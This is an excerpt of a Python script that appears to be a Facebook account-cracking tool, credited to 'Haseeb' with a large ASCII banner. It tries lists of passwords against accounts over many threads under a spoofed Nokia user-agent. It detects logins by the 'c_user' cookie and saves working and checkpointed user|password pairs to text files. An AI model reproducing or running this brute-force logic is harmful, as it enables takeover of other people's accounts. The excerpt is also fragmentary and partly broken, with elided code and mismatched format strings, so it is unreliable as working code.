...
from concurrent.futures import ThreadPoolExecutor as HasaN
...
logo =                                          """   
 __    __   ______    ______   ________  ________  _______  
|  \  |  \ /      \  /      \ |        \|        \|       \ 
| $$  | $$|  $$$$$$\|  $$$$$$\| $$$$$$$$| $$$$$$$$| $$$$$$$\
| $$__| $$| $$__| $$| $$___\$$| $$__    | $$__    | $$__/ $$
| $$    $$| $$    $$ \$$    \ | $$  \   | $$  \   | $$    $$
...
|Author   | Haseeb (Brand)      |
|Fb Id    | https://www.facebook.com/HaSeebO2008        |
|GitHub   | KgHasan             |
|Vol      |          6.2.0             |
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mHASEEB_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mHASEEB_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back HASEEB Menu ")
	    Sad_Boy()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[HASEEB] {loop}|{len(self.id)} [OK][{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
              ...
              "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [HASEEB-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('HASEEB_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [HASEEB-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('HASEEB_CP.txt' , 'a').write('%s\n' % wrt)
                        break
